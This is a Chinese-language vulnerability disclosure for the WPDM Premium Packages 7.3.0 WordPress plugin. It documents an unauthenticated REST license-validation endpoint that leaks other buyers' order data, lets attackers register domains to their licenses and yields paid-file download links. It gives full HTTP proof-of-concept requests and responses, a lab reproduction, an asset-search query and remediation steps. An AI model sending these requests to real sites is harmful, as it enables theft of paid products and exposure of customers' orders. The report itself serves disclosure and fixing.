# WPDM Premium Packages 许可证校验接口归属缺失导致匿名读取他人订单与下载付费文件

[English](README.md)

漏洞发现时间：2026-10-21

漏洞技术类型：未授权访问 / 越权读取与写入

## 漏洞描述

WPDM Premium Packages（WordPress Download Manager 的付费扩展，厂商 WordPress Download Manager，官方站点 wpdownloadmanager.com）是用于在 WordPress 上销售数字产品与订阅授权的商业插件，提供购物车、订单、订阅、许可证密钥与付费文件下载等能力，运行于 WordPress + PHP 技术栈，在公开互联网上有大量商业部署。

漏洞位于插件注册的 REST 接口 /wpdmpp/v1/license/validate（源文件 src/Api/Endpoints/LicenseEndpoint.php 第 48 至 63 行）。该接口的 permission_callback 被设置为 __return_true，即任何未登录访客都可调用；其回调 validateLicense()（同文件第 414 至 418 行）直接把请求参数 license_key 与 domain 交给 LicenseService::validateLicense()，第三个参数固定为 true，表示允许任意域名注册到该许可证。整条链路不校验调用者与许可证、订单之间的归属关系，也不要求任何会话、Cookie 或令牌。

因此，匿名访客只要给出一个许可证号，即可查询到该许可证对应的订单号与订单状态，并可把任意域名写入该许可证的域名列表（占用其授权名额），成功响应还会返回针对该域名的付费文件下载地址。

## 漏洞危害

匿名访客无需任何账号即可读取他人订单标识与订单状态，并把自己的域名注册进他人的许可证、占用其授权名额，同时取得该许可证对应的付费文件下载地址，从而绕过购买流程下载付费数字商品。

本地隔离靶场逐字观测：

| 观测项 | 结果 |
|---|---|
| 响应 status | VALID |
| 响应 order_id | NCCLAB-VICTIM-ORDER-001 |
| 响应 order_status | Completed |
| 响应 license.domains | ["attacker-probe.invalid"] |
| 响应 license.remaining_slots | 4（由 5 减 1，攻击者域名占用了名额） |

危害闭环：未授权读取与写入 | 收益：order_id=NCCLAB-VICTIM-ORDER-001、order_status=Completed、domains=["attacker-probe.invalid"]、remaining_slots 由 5 降为 4 | 证据：本地复现案例 3）危害达成观测 | 对照：不存在的许可证号返回 {"success":false,"message":"License key not found.","data":{"status":"INVALID","error":"LICENSE_KEY_NOT_FOUND"}}，同命名空间伪路由返回 rest_no_route

漏洞厂商全称：WordPress Download Manager（WPDM）

产品厂商归属国家及地区：印度

厂商主体证明：https://wordpress.org/plugins/wpdm-premium-packages/

## 已知受影响产品及版本

WPDM Premium Packages 7.3.0

> 版本依据：主文件 wpdm-premium-packages.php 第 6 行 Version: 7.3.0；readme.txt 第 7 行 Stable tag: 7.3.0。

- 厂商仓库：https://wordpress.org/plugins/wpdm-premium-packages/

- 最新版本证明（默认分支最新提交）：https://plugins.trac.wordpress.org/browser/wpdm-premium-packages/trunk

- 最新发布标签：https://wordpress.org/plugins/wpdm-premium-packages/#developers

## 互联网资产证明

### 1）精准测绘语法

body="/wp-content/plugins/wpdm-premium-packages/"

### 2）测绘平台截图

公开版本隐去测绘截图，以免识别第三方站点。

## 1、漏洞技术细节

### 1）完整PoC描述

插件在 src/Api/Endpoints/LicenseEndpoint.php 第 48 至 63 行注册 REST 路由 /wpdmpp/v1/license/validate，permission_callback 为 __return_true，仅要求 license_key 与 domain 两个字符串参数。回调 validateLicense() 第 414 至 418 行把两者直接交给 LicenseService::validateLicense($licenseKey, $domain, true)，第三参数固定为 true（允许把任意域名注册到许可证）。LicenseService 第 166 至 255 行按 licenseno 查库、校验订单状态后即注册域名，并把 order_id、order_status、download_url 等字段回填到响应。

完整请求报文：

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: target
Content-Type: application/json
User-Agent: Mozilla/5.0

{"license_key":"NCCLAB-VICTIM-LIC-001","domain":"attacker-probe.invalid"}
```

响应报文：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"data":{"status":"VALID","valid":true,"domain_registered":true,"order_id":"NCCLAB-VICTIM-ORDER-001","order_status":"Completed","auto_renew":0,"expire_date":0,"activation_date":1735689600,"license":{"license_no":"NCCLAB-VICTIM-LIC-001","domains":["attacker-probe.invalid"],"domain_limit":5,"remaining_slots":4,"expire_date":1893456000,"is_expired":false}},"message":"License validated successfully."}
```

响应中 order_id 与 order_status 是他人订单信息，license.domains 已包含攻击者提交的域名 attacker-probe.invalid，remaining_slots 由 domain_limit 5 减为 4，证明域名被真实写入该许可证。

注入参数解码后的原文：

```text
license_key = NCCLAB-VICTIM-LIC-001
domain      = attacker-probe.invalid
```

### 2）触发条件

无需登录权限。唯一前置是目标站点安装了 WPDM Premium Packages，且已存在至少一条有效许可证记录；攻击者需要知道或枚举许可证号，接口对该参数只做字符串清洗，无频率限制、无归属校验。

## 2、复现证明

### 本地复现案例

#### 1）基础环境搭建

本地隔离靶场部署 WordPress 7.1.3 + PHP 8.1 + MariaDB 10.4.32，启用 WordPress Download Manager 主插件与 WPDM Premium Packages 7.3.0。数据库表结构按插件自身安装器 includes/libs/Installer.php 第 110 至 126 行的定义建立 ahm_orders 与 ahm_licenses（字段 licenseno、oid、pid、status、domain、domain_limit、expire_date 等）。

在靶场内构造一条「他人」的已完成订单 NCCLAB-VICTIM-ORDER-001（order_status=Completed）与对应许可证 NCCLAB-VICTIM-LIC-001（domain_limit=5，域名列表为空），模拟真实站点中已购买用户的授权记录。

#### 2）漏洞触发操作

以完全匿名的会话（不带任何 Cookie、令牌、登录态）向靶场的 /?rest_route=/wpdmpp/v1/license/validate 发送上述 PoC 请求。

#### 3）危害达成观测

```http
POST /?rest_route=/wpdmpp/v1/license/validate HTTP/1.1
Host: 127.0.0.1:8911
Content-Type: application/json
User-Agent: NCC-lab

{"license_key":"NCCLAB-VICTIM-LIC-001","domain":"attacker-probe.invalid"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"data":{"status":"VALID","valid":true,"domain_registered":true,"order_id":"NCCLAB-VICTIM-ORDER-001","order_status":"Completed","auto_renew":0,"expire_date":0,"activation_date":1735689600,"license":{"license_no":"NCCLAB-VICTIM-LIC-001","domains":["attacker-probe.invalid"],"domain_limit":5,"remaining_slots":4,"expire_date":1893456000,"is_expired":false}},"message":"License validated successfully."}
```

本次写入在完全匿名上下文（未携带任何 Cookie、令牌或登录态）下完成。写入生效的逐字读回证据如下 —— 对目标库执行 SELECT licenseno, domain, domain_limit FROM wp_ahm_licenses WHERE licenseno='NCCLAB-VICTIM-LIC-001'， 返回记录中 domain 字段的值为：

```text
licenseno               domain                                          domain_limit
NCCLAB-VICTIM-LIC-001   a:1:{i:0;s:22:"attacker-probe.invalid";}        5
```

字段 domain 的值由空变为 a:1:{i:0;s:22:"attacker-probe.invalid";}（payload 原文逐字入库）， remaining_slots 由 5 变为 4，与响应中的 domain_registered=true 一致。

### 具体案例证明（3个）

#### 1）站点 A（域名已隐去） —— 目标站点注册了该 REST 路由，匿名调用被受理并进入参数校验分支

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-a.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

#### 2）站点 B（域名已隐去） —— 同一路由在同一产品的另一站点上同样匿名可达

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-b.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

#### 3）站点 C（域名已隐去） —— 同一路由在第三站点匿名可达，响应文案一致

```http
POST /wp-json/wpdmpp/v1/license/validate HTTP/1.1
Host: site-c.invalid
Content-Type: application/json
User-Agent: Mozilla/5.0

{}
```

```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"code":"rest_missing_callback_param","message":"Missing parameter(s): license_key, domain","data":{"status":400,"params":["license_key","domain"]}}
```

上述三站返回的是 WordPress REST 在回调执行前抛出的「缺少回调参数」错误，说明路由已注册且 permission_callback 对匿名放行；同命名空间下的伪路由 /wpdmpp/v1/ncc-bogus-zz9 返回 {"code":"rest_no_route",...}，可与真路由区分。为避免改动第三方数据，公网仅发送空请求体验证路由可达，域名注册与订单读取危害在本地隔离靶场完成观测。

### 其他受影响目标

公开版本隐去第三方站点域名与 IP 地址。

## 3、修复方案

### 临时解决方案

在反向代理或 Web 服务器层拦截对 /wp-json/wpdmpp/v1/license/validate 的外部访问，或启用 WordPress 的 REST 鉴权插件对该命名空间强制要求登录；亦可暂时停用 Premium Packages 插件的许可证校验 REST 路由。

### 正式解决方案

1. 把该路由的 permission_callback 从 __return_true 改为要求已登录用户，并在回调内校验当前用户是否为该许可证对应订单的购买者（比对 order.uid 与 get_current_user_id()）。

2. 仅在调用者拥有该许可证时允许 registerDomain；对第三方调用把 LicenseService::validateLicense() 的第三个参数改为 false，只做只读校验。

3. 在响应中移除或按需裁剪 order_id、order_status、download_url 等敏感字段，或改为返回与调用者绑定的短期签名下载地址。

4. 对 license_key 查询增加频率限制与失败计数，防止枚举。
